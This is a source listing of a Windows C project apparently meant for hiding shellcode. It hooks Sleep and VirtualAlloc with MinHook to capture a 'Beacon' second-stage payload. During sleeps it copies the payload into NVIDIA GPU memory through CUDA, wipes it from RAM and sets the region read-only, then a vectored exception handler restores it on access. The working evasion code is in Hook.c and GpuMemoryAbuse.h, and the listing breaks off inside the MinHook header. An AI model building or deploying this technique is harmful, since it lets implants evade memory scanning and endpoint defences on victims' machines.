Project Path: arc_gmh5225_GPU_ShellCode_p46hwni_

Source Tree:

```txt
arc_gmh5225_GPU_ShellCode_p46hwni_
├── GP
│   ├── Common.h
│   ├── GP.vcxproj
│   ├── GP.vcxproj.filters
│   ├── GP.vcxproj.user
│   ├── GpuMemoryAbuse.h
│   ├── Hook.c
│   ├── MinHook.h
│   ├── main.c
│   └── minhook.x64.lib
├── GP.sln
├── LICENSE
├── README.md
└── images
    └── demo1.png

```

`GP.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.1.32421.90
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "GP", "GP\GP.vcxproj", "{41B5DBE8-4C71-4D31-9319-36373D96059F}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Debug|x64.ActiveCfg = Debug|x64
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Debug|x64.Build.0 = Debug|x64
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Debug|x86.ActiveCfg = Debug|Win32
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Debug|x86.Build.0 = Debug|Win32
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Release|x64.ActiveCfg = Release|x64
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Release|x64.Build.0 = Release|x64
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Release|x86.ActiveCfg = Release|Win32
		{41B5DBE8-4C71-4D31-9319-36373D96059F}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {10BFFA93-32B1-4643-80C3-3E156BB22F36}
	EndGlobalSection
EndGlobal

```

`GP/Common.h`:

```h
#pragma once
#include <Windows.h>

// from GpuMemoryAbuse.h : check if a nividia gpu is present on the system, to do the thing
BOOL IsNvidiaGraphicsCardPresent();

// hook.c, this function does the following:
//	1- run functions that will initialize the cuda api struct and run other api to get us started ...
//	2- install 2 hooks, on sleep and on virtualalloc, using minhook library
//	3- start the vector exception handler
BOOL InitializeMemToGpu ();


```

`GP/GP.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{41b5dbe8-4c71-4d31-9319-36373d96059f}</ProjectGuid>
    <RootNamespace>GP</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Hook.c" />
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="GpuMemoryAbuse.h" />
    <ClInclude Include="Common.h" />
    <ClInclude Include="MinHook.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`GP/GP.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Hook.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="GpuMemoryAbuse.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MinHook.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`GP/GP.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`GP/GpuMemoryAbuse.h`:

```h
// the whole thing is from : https://github.com/vxunderground/VXUG-Papers/blob/main/GpuMemoryAbuse.cpp mwa mwa @vxunderground

#pragma once
#include <Windows.h>
#include "Common.h"
#pragma warning(disable:6011)


#define CUDACALL __stdcall
#define CUDA_SUCCESS 0

typedef struct PCUDE_CONTEXT* CUDA_CONTEXT;
typedef INT(CUDACALL* CUDAMEMORYALLOCATE)(ULONG_PTR, SIZE_T);
typedef INT(CUDACALL* CUDAINIT)(INT);
typedef INT(CUDACALL* CUDAGETDEVICECOUNT)(PINT);
typedef INT(CUDACALL* CUDAGETDEVICE)(PINT, INT);
typedef INT(CUDACALL* CUDACREATECONTEXT)(CUDA_CONTEXT*, DWORD, INT);
typedef INT(CUDACALL* CUDADESTROYCONTEXT)(CUDA_CONTEXT*);
typedef INT(CUDACALL* CUDAMEMORYCOPYTODEVICE)(ULONG_PTR, PVOID, SIZE_T);
typedef INT(CUDACALL* CUDAMEMORYCOPYTOHOST)(PVOID, ULONG_PTR, SIZE_T);
typedef INT(CUDACALL* CUDAMEMORYFREE)(ULONG_PTR);
CUDA_CONTEXT Context = NULL;


typedef struct _NVIDIA_API_TABLE {
	HMODULE NvidiaLibary;
	CUDAMEMORYALLOCATE CudaMemoryAllocate;
	CUDAINIT CudaInit;
	CUDAGETDEVICECOUNT CudaGetDeviceCount;
	CUDAGETDEVICE CudaGetDevice;
	CUDACREATECONTEXT CudaCreateContext;
	CUDAMEMORYCOPYTODEVICE CudaMemoryCopyToDevice;
	CUDAMEMORYCOPYTOHOST CudaMemoryCopyToHost;
	CUDAMEMORYFREE CudaMemoryFree;
	CUDADESTROYCONTEXT CudaDestroyContext;
} NVIDIA_API_TABLE, * PNVIDIA_API_TABLE;


NVIDIA_API_TABLE Api = { 0 };


SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

PWCHAR StringLocateCharW(PWCHAR String, INT Character)
{
	do
	{
		if (*String == Character)
			return (PWCHAR)String;

	} while (*String++);

	return NULL;
}

INT StringCompareStringRegionW(PWCHAR String1, PWCHAR String2, SIZE_T Count)
{
	UCHAR Block1, Block2;
	while (Count-- > 0)
	{
		Block1 = (UCHAR)*String1++;
		Block2 = (UCHAR)*String2++;

		if (Block1 != Block2)
			return Block1 - Block2;

		if (Block1 == '\0')
			return 0;
	}

	return 0;
}

PWCHAR StringFindSubstringW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR pPointer = String1;
	DWORD Length = (DWORD)StringLengthW(String2);

	for (; (pPointer = StringLocateCharW(pPointer, *String2)) != 0; pPointer++)
	{
		if (StringCompareStringRegionW(pPointer, String2, Length) == 0)
			return (PWCHAR)pPointer;
	}

	return NULL;
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLengthW(String)], String2);

	return String;
}

BOOL IsNvidiaGraphicsCardPresent()
{
	DISPLAY_DEVICEW DisplayDevice; RtlZeroMemory(&DisplayDevice, sizeof(DISPLAY_DEVICEW));
	DisplayDevice.cb = sizeof(DISPLAY_DEVICEW);

	DWORD dwDeviceId = ERROR_SUCCESS;

	while (EnumDisplayDevicesW(NULL, dwDeviceId, &DisplayDevice, 0))
	{
		if (StringFindSubstringW(DisplayDevice.DeviceString, (PWCHAR)L"NVIDIA") != NULL)
			return TRUE;
	}

	return FALSE;
}

BOOL InitNvidiaCudaAPITable(PNVIDIA_API_TABLE Api)
{
	Api->NvidiaLibary = LoadLibraryW(L"nvcuda.dll");
	if (Api->NvidiaLibary == NULL)
		return FALSE;

	Api->CudaCreateContext = (CUDACREATECONTEXT)GetProcAddress(Api->NvidiaLibary, "cuCtxCreate_v2");
	Api->CudaGetDevice = (CUDAGETDEVICE)GetProcAddress(Api->NvidiaLibary, "cuDeviceGet");
	Api->CudaGetDeviceCount = (CUDAGETDEVICECOUNT)GetProcAddress(Api->NvidiaLibary, "cuDeviceGetCount");
	Api->CudaInit = (CUDAINIT)GetProcAddress(Api->NvidiaLibary, "cuInit");
	Api->CudaMemoryAllocate = (CUDAMEMORYALLOCATE)GetProcAddress(Api->NvidiaLibary, "cuMemAlloc_v2");
	Api->CudaMemoryCopyToDevice = (CUDAMEMORYCOPYTODEVICE)GetProcAddress(Api->NvidiaLibary, "cuMemcpyHtoD_v2");
	Api->CudaMemoryCopyToHost = (CUDAMEMORYCOPYTOHOST)GetProcAddress(Api->NvidiaLibary, "cuMemcpyDtoH_v2");
	Api->CudaMemoryFree = (CUDAMEMORYFREE)GetProcAddress(Api->NvidiaLibary, "cuMemFree_v2");
	Api->CudaDestroyContext = (CUDADESTROYCONTEXT)GetProcAddress(Api->NvidiaLibary, "cuCtxDestroy");

	if (!Api->CudaCreateContext || !Api->CudaGetDevice || !Api->CudaGetDeviceCount || !Api->CudaInit || !Api->CudaDestroyContext)
		return FALSE;

	if (!Api->CudaMemoryAllocate || !Api->CudaMemoryCopyToDevice || !Api->CudaMemoryCopyToHost || !Api->CudaMemoryFree)
		return FALSE;

	return TRUE;
}

BOOL InitAPITable2() {

	INT DeviceCount = 0;
	INT Device = 0;

	if (Api.CudaInit(0) != CUDA_SUCCESS)
		return FALSE;

	if (Api.CudaGetDeviceCount(&DeviceCount) != CUDA_SUCCESS || DeviceCount == 0)
		return FALSE;

	if (Api.CudaGetDevice(&Device, DeviceCount - 1) != CUDA_SUCCESS)
		return FALSE;

	if (Api.CudaCreateContext(&Context, 0, Device) != CUDA_SUCCESS)
		return FALSE;

	return TRUE;
}

// mem to gpu helper
ULONG_PTR RtlAllocateGpuMemory(PNVIDIA_API_TABLE Api, DWORD ByteSize)
{
	ULONG_PTR GpuBufferPointer = NULL;

	if (ByteSize == 0)
		return NULL;

	if (Api->CudaMemoryAllocate((ULONG_PTR)&GpuBufferPointer, ByteSize) != CUDA_SUCCESS)
		return NULL;

	return GpuBufferPointer;

}

// move to gpu memory and clean the payload
ULONG_PTR ToGPU(PVOID Address, SIZE_T Size, PNVIDIA_API_TABLE Api) {
	ULONG_PTR storageGPU = NULL;
	if ((storageGPU = RtlAllocateGpuMemory(Api, (DWORD)Size)) == NULL) {
		printf("[!] RtlAllocateGpuMemory failed ... \n");
		return NULL;
	}
	Api->CudaMemoryCopyToDevice(storageGPU, (PVOID)Address, Size);
	printf("[i] Moved [ MEM 0x%p ] to [ GPU: 0x%p ] \n", (PVOID)Address, (PVOID)storageGPU);

	ZeroMemory(Address, Size);
	return storageGPU;
}


// move to the memory, and free the gpu memory
VOID ToMem(PVOID Address, SIZE_T Size, ULONG_PTR storageGPU, PNVIDIA_API_TABLE Api) {
	Api->CudaMemoryCopyToHost((PVOID)Address, storageGPU, Size);
	Api->CudaMemoryFree(storageGPU);
	printf("[i] Moved [ GPU 0x%p ] to [ MEM: 0x%p ] \n", (PVOID)storageGPU, (PVOID)Address);
}

```

`GP/Hook.c`:

```c
#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "GpuMemoryAbuse.h"
#include "MinHook.h"
#pragma comment(lib, "minhook.x64.lib")

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// struct to hold the 2nd stage payload
struct BeaconConfig {

	LPVOID		Stage2Address;	//where will it land
	SIZE_T		Stage2Size;		//size of the 2nd stage
	
	ULONG_PTR	storageGPU;		//gpu address of where we will save the payload
};
struct BeaconConfig Conf = { 0 };

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// the hooked functions:
typedef VOID	(WINAPI* SLEEP) (DWORD);
typedef LPVOID	(WINAPI* VIRTUALALLOC) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// keep a global variable unhooked
SLEEP fnSleep = NULL;
VIRTUALALLOC fnVirtualAlloc = NULL;

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// function pre-definition
VOID WINAPI MySleep(DWORD dwMilliseconds);
LPVOID WINAPI MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExceptInfo);

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// function to install hooks and run the veh exception handler and get us started with the gpu
BOOL InitializeMemToGpu() {
	if (!InitNvidiaCudaAPITable(&Api)) {
		printf("[-] InitNvidiaCudaAPITable failed ... \n");
		return FALSE;
	}
	if (!InitAPITable2()){
		printf("[-] InitAPITable2 failed ... \n");
		return FALSE;
	}

	fnSleep = Sleep;
	fnVirtualAlloc = VirtualAlloc;
	AddVectoredExceptionHandler(1, &VEHHandler);

	if (MH_Initialize() != MH_OK) {
		printf("[-] MH_Initialize failed... \n");
		return FALSE;
	}
	if (MH_CreateHook(&Sleep, &MySleep, &fnSleep) != MH_OK) {
		printf("[-] MH_CreateHook[1] failed... \n");
		return FALSE;
	}
	if (MH_CreateHook(&VirtualAlloc, &MyVirtualAlloc, &fnVirtualAlloc) != MH_OK) {
		printf("[-] MH_CreateHook [2] failed... \n");
		return FALSE;
	}
	if (MH_EnableHook(&Sleep) != MH_OK) {
		printf("[-] MH_EnableHook [1] failed... \n");
		return FALSE;
	}
	if (MH_EnableHook(&VirtualAlloc) != MH_OK) {
		printf("[-] MH_EnableHook [2] failed... \n");
		return FALSE;
	}
	return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// the function replacing Sleep
VOID WINAPI MySleep(DWORD dwMilliseconds) {
	printf("[i] Sleeping for : %d\n", (unsigned int) dwMilliseconds);
	DWORD Old;
	
	if (dwMilliseconds >= 400) { // interactive + jitter, idk its up to you
		Conf.storageGPU = ToGPU(Conf.Stage2Address, Conf.Stage2Size, &Api);
		if (!VirtualProtect(Conf.Stage2Address, Conf.Stage2Size, PAGE_READONLY, &Old)) {
			printf("[-] VirtualProtect [RO] failed with error: %d \n", GetLastError());
		}
	}
	
	fnSleep(dwMilliseconds);
}
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// function replacing VirtualAlloc
LPVOID WINAPI MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	DWORD Old;
	LPVOID Stage2Address = fnVirtualAlloc(NULL, dwSize, flAllocationType, PAGE_READWRITE); // better than rwx allocation all at once 
	
	if (Stage2Address != NULL && dwSize != NULL){
		VirtualProtect(Stage2Address, dwSize, PAGE_EXECUTE_READWRITE, &Old);
	}
	Conf.Stage2Address = Stage2Address;
	Conf.Stage2Size = dwSize;
	printf("[+] Landed 2nd Stage [%d] At : 0x%p \n", (unsigned int) Conf.Stage2Size, Conf.Stage2Address);
	// unhooking
	if (MH_DisableHook(&VirtualAlloc) != MH_OK) {
		printf("[-] MH_DisableHook failed... \n");
	}

	return Stage2Address;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// the veh exception handler
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExceptInfo) {

	ULONG_PTR ExptnAddress = pExceptInfo->ContextRecord->Rip;
	DWORD Old;

	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		if (ExptnAddress >= (ULONG_PTR)Conf.Stage2Address && ExptnAddress <= (ULONG_PTR)((ULONG_PTR)Conf.Stage2Address + Conf.Stage2Size)) {
			if (!VirtualProtect(Conf.Stage2Address, Conf.Stage2Size, PAGE_EXECUTE_READWRITE, &Old)) {
				printf("[-] VirtualProtect [RWX] failed with error: %d \n", GetLastError());
			}
			ToMem(Conf.Stage2Address, Conf.Stage2Size, Conf.storageGPU, &Api);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else {
			printf("[!] Exception Address Is From Un-Monitored Memory; 0x%0-16p \n", (void*)ExptnAddress);
		}

	}
	else {
		printf("[!] The EXCEPTION at [ 0x%p ] isnt ACCESS_VIOLATION; 0x%0-8X \n", (void*)pExceptInfo->ContextRecord->Rip, pExceptInfo->ExceptionRecord->ExceptionCode);
	}

	return EXCEPTION_CONTINUE_SEARCH;
}
```

`GP/MinHook.h`:

```h
/*
 *  MinHook - The Minimalistic API Hooking Library for x64/x86
 *  Copyright (C) 2009-2017 Tsuda Kageyu.
 *  All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *   1. Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *   2. Redistributions in binary form must reproduce the above copyright
 *      notice, this list of conditions and the following disclaimer in the
 *      documentation and/or other materials provided with the distribution.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 *  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 *  TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 *  PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER
 *  OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 *  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 *  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 *  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 *  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#pragma once

#if !(defined _M_IX86) && !(defined _M_X64) && !(defined __i386__) && !(defined __x86_64__)
#error MinHook supports only x86 and x64 systems.
#endif

#include <windows.h>

 // MinHook Error Codes.
typedef enum MH_STATUS
{
    // Unknown error. Should not be returned.
    MH_UNKNOWN = -1,

    // Successful.
    MH_OK = 0,

    // MinHook is already initialized.
    MH_ERROR_ALREADY_INITIALIZED,

    // MinHook is not initialized yet, or already uninitialized.
    MH_ERROR_NOT_INITIALIZED,

    // The hook for the specified target function is already created.
    MH_ERROR_ALREADY_CREATED,

    // The hook for the specified target function is not created yet.
    MH_ERROR_NOT_CREATED,

    // The hook for the specified target function is already enabled.
    MH_ERROR_ENABLED,

    // The hook for the specified target function is not enabled yet, or already
    // disabled.
    MH_ERROR_DISABLED,

    // The specified pointer is invalid. It points the address of non-allocated
    // and/or non-executable region.
    MH_ERROR_NOT_EXECUTABLE,

    // The specified target function cannot be hooked.
    MH_ERROR_UNSUPPORTED_FUNCTION,

    // Failed to allocate memory.
    MH_ERROR_MEMORY_ALLOC,

    // Failed to change the memory protection.
    MH_ERROR_MEMORY_PROTECT,

    // The specified module is not loaded.
    MH_ERROR_MODULE_NOT_FOUND,

    // The specified function is not found.
    MH_ERROR_FUNCTION_NOT_FOUND
}
MH_STATUS;

// Can be passed as a parameter to MH_EnableHook, MH_DisableHook,
// MH_QueueEnableHook or MH_QueueDisableHook.
#define MH_ALL_HOOKS NULL

#ifdef __cplusplus
extern "C" {
#endif

    // Initialize the MinHook library. You must call this function EXACTLY ONCE
    // at the beginning of your program.
    MH_STATUS WINAPI MH_Initialize(VOID);

    // Uninitialize the MinHook library. You must call this function EXACTLY
    // ONCE at the end of your program.
    MH_STATUS WINAPI MH_Uninitialize(VOID);

    // Creates a hook for the specified target function, in disabled state.
    // Parameters:
    //   pTarget     [in]  A pointer to the target function, which will be
    //                     overridden by the detour function.
    //   pDetour     [in]  A pointer to the detour function, which will override
    //                     the target function.
    //   ppOriginal  [out] A pointer to the trampoline function, which will be
    //                     used to call the original target function.
    //                     This parameter can be NULL.
    MH_STATUS WINAPI MH_CreateHook(LPVOID pTarget, LPVOID pDetour, LPVOID* ppOriginal);

    // Creates a hook for the specified API function, in disabled state.
    // Parameters:
    //   pszModule   [in]  A pointer to the loaded module name which contains the
    //                     target function.
    //   pszProcName [in]  A pointer to the target function name, which will be
    //                     overridden by the detour function.
    //   pDetour     [in]  A pointer to the detour function, which will override
    //                     the target function.
    //   ppOriginal  [out] A pointer to the trampoline function, which will be
    //                     used to call the original target function.
    //                     This parameter can be NULL.
    MH_STATUS WINAPI MH_CreateHookApi(
        LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, LPVOID* ppOriginal);

    // Creates a hook for the specified API function, in disabled state.
    // Parameters:
    //   pszModule   [in]  A pointer to the loaded module name which contains the
    //                     target function.
    //   pszProcName [in]  A pointer to the target function name, which will be
    //                     overridden by the detour function.
    //   pDetour     [in]  A pointer to the detour function, which will override
    //                     the target function.
    //   ppOriginal  [out] A pointer to the trampoline function, which will be
    //                     used to call the original target function.
    //                     This parameter can be NULL.
    //   ppTarget    [out] A pointer to the target function, which will be used
    //                     with other functions.
    //                     This parameter can be NULL.
    MH_STATUS WINAPI MH_CreateHookApiEx(
        LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, LPVOID* ppOriginal, LPVOID* ppTarget);

    // Removes an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    MH_STATUS WINAPI MH_RemoveHook(LPVOID pTarget);

    // Enables an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                enabled in one go.
    MH_STATUS WINAPI MH_EnableHook(LPVOID pTarget);

    // Disables an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                disabled in one go.
    MH_STATUS WINAPI MH_DisableHook(LPVOID pTarget);

    // Queues to enable an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                queued to be enabled.
    MH_STATUS WINAPI MH_QueueEnableHook(LPVOID pTarget);

    // Queues to disable an already created hook.
